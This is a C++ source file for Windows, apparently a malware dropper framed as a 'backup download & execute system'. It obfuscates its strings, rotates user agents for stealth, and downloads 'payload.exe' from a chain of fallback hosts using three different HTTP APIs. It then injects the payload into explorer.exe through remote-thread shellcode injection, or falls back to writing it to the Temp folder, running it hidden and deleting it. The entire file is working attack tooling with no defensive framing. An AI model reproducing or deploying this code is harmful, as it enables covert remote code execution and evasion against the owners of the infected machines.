#pragma once
#include <windows.h>
#include <winhttp.h>
#include <wininet.h>
#include <urlmon.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <algorithm>
#include <memory>
#include <fstream>
#include <sstream>
#include <map>
#include <atomic>
#include <mutex>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "psapi.lib")

// Advanced Obfuscation for Backup Systems
namespace BackupObfuscation {
    constexpr uint8_t XOR_KEY = 0xE9;
    constexpr uint8_t ROT_OFFSET = 23;
    
    template<size_t N>
    struct ObfuscatedString {
        char data[N];
        constexpr ObfuscatedString(const char(&str)[N]) : data{} {
            for (size_t i = 0; i < N; ++i) {
                data[i] = ((str[i] + ROT_OFFSET) ^ XOR_KEY);
            }
        }
        
        std::string decrypt() const {
            std::string result;
            for (size_t i = 0; i < N - 1; ++i) {
                result += static_cast<char>((data[i] ^ XOR_KEY) - ROT_OFFSET);
            }
            return result;
        }
    };
}

#define BACKUP_OBF(str) BackupObfuscation::ObfuscatedString(str).decrypt()

// Download Source Configuration
struct DownloadSource {
    std::string url;
    std::string userAgent;
    std::map<std::string, std::string> headers;
    int priority;          // 1 = highest priority
    bool isBackup;
    std::string sourceType; // "primary", "backup1", "backup2", "emergency"
    
    DownloadSource(const std::string& u, int p, bool backup = false, const std::string& type = "primary") 
        : url(u), priority(p), isBackup(backup), sourceType(type) {
        // Default user agents for stealth
        std::vector<std::string> userAgents = {
            BACKUP_OBF("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
            BACKUP_OBF("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101"),
            BACKUP_OBF("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0"),
            BACKUP_OBF("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36")
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, userAgents.size() - 1);
        userAgent = userAgents[dis(gen)];
    }
};

// Execution Configuration
struct ExecutionConfig {
    bool useFilelessExecution;
    bool useDiskExecution;
    std::string targetProcess;     // For fileless injection
    std::string diskPath;          // For disk execution
    bool deleteAfterExecution;
    bool runAsAdmin;
    bool hideWindow;
    int executionDelay;            // Seconds to wait before execution
    
    ExecutionConfig() {
        useFilelessExecution = true;
        useDiskExecution = true;      // Always have backup method
        targetProcess = BACKUP_OBF("explorer.exe");
        diskPath = BACKUP_OBF("C:\\Windows\\Temp\\");
        deleteAfterExecution = true;
        runAsAdmin = false;
        hideWindow = true;
        executionDelay = 0;
    }
};

// Advanced Backup-Integrated Downloader
class BackupIntegratedDownloader {
private:
    std::vector<DownloadSource> downloadSources;
    ExecutionConfig execConfig;
    std::atomic<bool> isDownloading{false};
    std::mutex downloadMutex;
    
    // Multiple backup download methods
    std::vector<uint8_t> downloadWithWinHTTP(const DownloadSource& source) {
        std::vector<uint8_t> data;
        
        HINTERNET hSession = WinHttpOpen(source.userAgent.empty() ? 
                                       BACKUP_OBF("BackupDownloader/1.0").c_str() : 
                                       source.userAgent.c_str(),
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME,
                                       WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return data;
        
        // Parse URL
        URL_COMPONENTS urlComp = {};
        urlComp.dwStructSize = sizeof(urlComp);
        
        std::wstring wideURL(source.url.begin(), source.url.end());
        wchar_t hostname[256], path[1024];
        urlComp.lpszHostName = hostname;
        urlComp.dwHostNameLength = sizeof(hostname) / sizeof(wchar_t);
        urlComp.lpszUrlPath = path;
        urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);
        
        if (!WinHttpCrackUrl(wideURL.c_str(), 0, 0, &urlComp)) {
            WinHttpCloseHandle(hSession);
            return data;
        }
        
        HINTERNET hConnect = WinHttpConnect(hSession, hostname, urlComp.nPort, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return data;
        }
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                              WINHTTP_NO_REFERER,
                                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                                              urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
        
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return data;
        }
        
        // Add custom headers
        for (const auto& header : source.headers) {
            std::string headerStr = header.first + ": " + header.second;
            std::wstring wideHeader(headerStr.begin(), headerStr.end());
            WinHttpAddRequestHeaders(hRequest, wideHeader.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
        }
        
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                              WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return data;
        }
        
        DWORD bytesAvailable = 0;
        do {
            if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) break;
            
            if (bytesAvailable > 0) {
                std::vector<uint8_t> buffer(bytesAvailable);
                DWORD bytesRead = 0;
                
                if (WinHttpReadData(hRequest, buffer.data(), bytesAvailable, &bytesRead)) {
                    data.insert(data.end(), buffer.begin(), buffer.begin() + bytesRead);
                }
            }
        } while (bytesAvailable > 0);
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        
        return data;
    }
    
    std::vector<uint8_t> downloadWithWinINet(const DownloadSource& source) {
        std::vector<uint8_t> data;
        
        HINTERNET hInternet = InternetOpenA(source.userAgent.c_str(),
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hInternet) return data;
        
        HINTERNET hUrl = InternetOpenUrlA(hInternet, source.url.c_str(),
                                        NULL, 0,
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
                                        0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            return data;
        }
        
        const DWORD bufferSize = 4096;
        std::vector<uint8_t> buffer(bufferSize);
        DWORD bytesRead = 0;
        
        while (InternetReadFile(hUrl, buffer.data(), bufferSize, &bytesRead) && bytesRead > 0) {
            data.insert(data.end(), buffer.begin(), buffer.begin() + bytesRead);
        }
        
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        
        return data;
    }
    
    std::vector<uint8_t> downloadWithURLMon(const DownloadSource& source) {
        std::vector<uint8_t> data;
        
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string tempFile = std::string(tempPath) + BACKUP_OBF("backup_download_") + 
                              std::to_string(GetTickCount()) + BACKUP_OBF(".tmp");
        
        HRESULT hr = URLDownloadToFileA(NULL, source.url.c_str(), tempFile.c_str(), 0, NULL);
        if (SUCCEEDED(hr)) {
            std::ifstream file(tempFile, std::ios::binary);
            if (file.is_open()) {
                file.seekg(0, std::ios::end);
                size_t fileSize = file.tellg();
                file.seekg(0, std::ios::beg);
                
                data.resize(fileSize);
                file.read(reinterpret_cast<char*>(data.data()), fileSize);
                file.close();
            }
            DeleteFileA(tempFile.c_str());
        }
        
        return data;
    }
    
    std::vector<uint8_t> downloadWithFallbackMethods(const DownloadSource& source) {
        std::vector<uint8_t> data;
        
        // Try WinHTTP first (most reliable)
        data = downloadWithWinHTTP(source);
        if (!data.empty()) return data;
        
        // Fallback to WinINet
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        data = downloadWithWinINet(source);
        if (!data.empty()) return data;
        
        // Final fallback to URLMon
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        data = downloadWithURLMon(source);
        
        return data;
    }
    
    bool injectIntoProcess(const std::string& processName, const std::vector<uint8_t>& payload) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        // Allocate memory in target process
                        void* pRemoteMem = VirtualAllocEx(hProcess, NULL, payload.size(),
                                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (pRemoteMem) {
                            // Write payload to target process
                            SIZE_T bytesWritten = 0;
                            if (WriteProcessMemory(hProcess, pRemoteMem, payload.data(), 
                                                 payload.size(), &bytesWritten)) {
                                
                                // Create remote thread to execute payload
                                HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                                                   (LPTHREAD_START_ROUTINE)pRemoteMem,
                                                                   NULL, 0, NULL);
                                if (hThread) {
                                    CloseHandle(hThread);
                                    CloseHandle(hProcess);
                                    CloseHandle(hSnapshot);
                                    return true;
                                }
                            }
                            VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    bool executeDiskFile(const std::string& filePath) {
        if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            return false;
        }
        
        STARTUPINFOA si = {};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = execConfig.hideWindow ? SW_HIDE : SW_SHOWNORMAL;
        
        PROCESS_INFORMATION pi = {};
        
        BOOL result = CreateProcessA(filePath.c_str(), NULL, NULL, NULL, FALSE,
                                   execConfig.hideWindow ? CREATE_NO_WINDOW : 0,
                                   NULL, NULL, &si, &pi);
        
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            if (execConfig.deleteAfterExecution) {
                // Wait a bit before deletion
                std::this_thread::sleep_for(std::chrono::seconds(2));
                DeleteFileA(filePath.c_str());
            }
            
            return true;
        }
        
        return false;
    }
    
    std::string generateRandomFilename(const std::string& extension = ".exe") {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        std::string chars = BACKUP_OBF("0123456789ABCDEF");
        std::string filename;
        
        // Generate random filename
        for (int i = 0; i < 12; ++i) {
            filename += chars[dis(gen)];
        }
        
        return filename + extension;
    }
    
public:
    BackupIntegratedDownloader() {
        // Initialize with multiple backup sources
        initializeBackupSources();
    }
    
    void initializeBackupSources() {
        downloadSources.clear();
        
        // Primary sources (highest priority)
        downloadSources.emplace_back(BACKUP_OBF("https://primary.cdn.server.com/payload.exe"), 1, false, "primary");
        downloadSources.emplace_back(BACKUP_OBF("https://main.distribution.net/files/update.exe"), 1, false, "primary");
        
        // Backup sources (medium priority)
        downloadSources.emplace_back(BACKUP_OBF("https://backup1.storage.io/data/payload.exe"), 2, true, "backup1");
        downloadSources.emplace_back(BACKUP_OBF("https://mirror.filehost.org/downloads/update.exe"), 2, true, "backup1");
        downloadSources.emplace_back(BACKUP_OBF("https://secondary.cloud.net/public/payload.exe"), 2, true, "backup1");
        
        // Additional backup sources (lower priority)
        downloadSources.emplace_back(BACKUP_OBF("https://backup2.archive.com/files/update.exe"), 3, true, "backup2");
        downloadSources.emplace_back(BACKUP_OBF("https://fallback.hosting.co/data/payload.exe"), 3, true, "backup2");
        downloadSources.emplace_back(BACKUP_OBF("https://redundant.storage.org/backup/update.exe"), 3, true, "backup2");
        
        // Emergency sources (lowest priority)
        downloadSources.emplace_back(BACKUP_OBF("https://emergency.cdn.io/emergency/payload.exe"), 4, true, "emergency");
        downloadSources.emplace_back(BACKUP_OBF("https://last-resort.host.net/final/update.exe"), 4, true, "emergency");
        
        // Sort by priority
        std::sort(downloadSources.begin(), downloadSources.end(),
                 [](const DownloadSource& a, const DownloadSource& b) {
                     return a.priority < b.priority;
                 });
    }
    
    void addBackupSource(const std::string& url, int priority = 3, bool isBackup = true, const std::string& type = "custom") {
        downloadSources.emplace_back(url, priority, isBackup, type);
        
        // Re-sort by priority
        std::sort(downloadSources.begin(), downloadSources.end(),
                 [](const DownloadSource& a, const DownloadSource& b) {
                     return a.priority < b.priority;
                 });
    }
    
    void setExecutionConfig(const ExecutionConfig& config) {
        execConfig = config;
    }
    
    bool downloadAndExecute() {
        if (isDownloading.exchange(true)) {
            return false; // Already downloading
        }
        
        std::lock_guard<std::mutex> lock(downloadMutex);
        
        std::vector<uint8_t> payload;
        DownloadSource successfulSource("", 999);
        bool downloadSuccess = false;
        
        // Try each source in priority order
        for (const auto& source : downloadSources) {
            std::cout << "[BACKUP] Attempting download from " << source.sourceType 
                      << " (Priority: " << source.priority << ")" << std::endl;
            
            payload = downloadWithFallbackMethods(source);
            
            if (!payload.empty()) {
                std::cout << "[BACKUP] Successfully downloaded " << payload.size() 
                          << " bytes from " << source.sourceType << std::endl;
                successfulSource = source;
                downloadSuccess = true;
                break;
            } else {
                std::cout << "[BACKUP] Failed to download from " << source.sourceType 
                          << ", trying next backup..." << std::endl;
                
                // Small delay between attempts
                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            }
        }
        
        if (!downloadSuccess || payload.empty()) {
            std::cout << "[BACKUP] ALL BACKUP SOURCES FAILED! No payload downloaded." << std::endl;
            isDownloading = false;
            return false;
        }
        
        // Apply execution delay if configured
        if (execConfig.executionDelay > 0) {
            std::cout << "[BACKUP] Waiting " << execConfig.executionDelay 
                      << " seconds before execution..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(execConfig.executionDelay));
        }
        
        bool executionSuccess = false;
        
        // Try fileless execution first (if enabled)
        if (execConfig.useFilelessExecution) {
            std::cout << "[BACKUP] Attempting fileless execution into " 
                      << execConfig.targetProcess << std::endl;
            
            if (injectIntoProcess(execConfig.targetProcess, payload)) {
                std::cout << "[BACKUP] Fileless execution successful!" << std::endl;
                executionSuccess = true;
            } else {
                std::cout << "[BACKUP] Fileless execution failed, falling back to disk execution" << std::endl;
            }
        }
        
        // Fallback to disk execution (if not successful with fileless or if disk execution is enabled)
        if (!executionSuccess && execConfig.useDiskExecution) {
            std::string filename = generateRandomFilename();
            std::string fullPath = execConfig.diskPath + filename;
            
            std::cout << "[BACKUP] Attempting disk execution: " << fullPath << std::endl;
            
            // Write payload to disk
            std::ofstream outFile(fullPath, std::ios::binary);
            if (outFile.is_open()) {
                outFile.write(reinterpret_cast<const char*>(payload.data()), payload.size());
                outFile.close();
                
                // Execute from disk
                if (executeDiskFile(fullPath)) {
                    std::cout << "[BACKUP] Disk execution successful!" << std::endl;
                    executionSuccess = true;
                } else {
                    std::cout << "[BACKUP] Disk execution failed!" << std::endl;
                    DeleteFileA(fullPath.c_str()); // Clean up on failure
                }
            } else {
                std::cout << "[BACKUP] Failed to write payload to disk!" << std::endl;
            }
        }
        
        isDownloading = false;
        return executionSuccess;
    }
    
    void testAllBackupSources() {
        std::cout << "[BACKUP] Testing all backup sources..." << std::endl;
        
        for (const auto& source : downloadSources) {
            std::cout << "[BACKUP] Testing " << source.sourceType 
                      << " (Priority: " << source.priority << "): " << source.url << std::endl;
            
            auto data = downloadWithFallbackMethods(source);
            
            if (!data.empty()) {
                std::cout << "[BACKUP] ✅ SUCCESS - Downloaded " << data.size() << " bytes" << std::endl;
            } else {
                std::cout << "[BACKUP] ❌ FAILED - No data received" << std::endl;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }
    
    std::vector<DownloadSource> getAvailableSources() const {
        return downloadSources;
    }
    
    bool isCurrentlyDownloading() const {
        return isDownloading;
    }
};

// Main demonstration function
int main() {
    try {
        std::cout << "🔥 BACKUP-INTEGRATED DOWNLOAD & EXECUTE SYSTEM 🔥" << std::endl;
        std::cout << "=================================================" << std::endl;
        
        BackupIntegratedDownloader downloader;
        
        // Configure execution settings
        ExecutionConfig config;
        config.useFilelessExecution = true;   // Try fileless first
        config.useDiskExecution = true;       // Always have disk backup
        config.targetProcess = "explorer.exe"; // For fileless injection
        config.diskPath = "C:\\Windows\\Temp\\";
        config.deleteAfterExecution = true;
        config.hideWindow = true;
        config.executionDelay = 2; // 2 second delay
        
        downloader.setExecutionConfig(config);
        
        // Add custom backup sources
        downloader.addBackupSource("https://custom.backup.site.com/payload.exe", 2, true, "custom_backup");
        downloader.addBackupSource("https://personal.storage.net/files/update.exe", 3, true, "personal_backup");
        
        std::cout << "\n[BACKUP] Available sources:" << std::endl;
        auto sources = downloader.getAvailableSources();
        for (const auto& source : sources) {
            std::cout << "  - " << source.sourceType << " (Priority: " << source.priority 
                      << ", Backup: " << (source.isBackup ? "Yes" : "No") << ")" << std::endl;
        }
        
        std::cout << "\n[BACKUP] Testing backup sources..." << std::endl;
        downloader.testAllBackupSources();
        
        std::cout << "\n[BACKUP] Starting download & execute with backup system..." << std::endl;
        
        if (downloader.downloadAndExecute()) {
            std::cout << "\n✅ [BACKUP] Download & Execute completed successfully!" << std::endl;
        } else {
            std::cout << "\n❌ [BACKUP] Download & Execute failed even with all backups!" << std::endl;
        }
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
    
    return 0;
}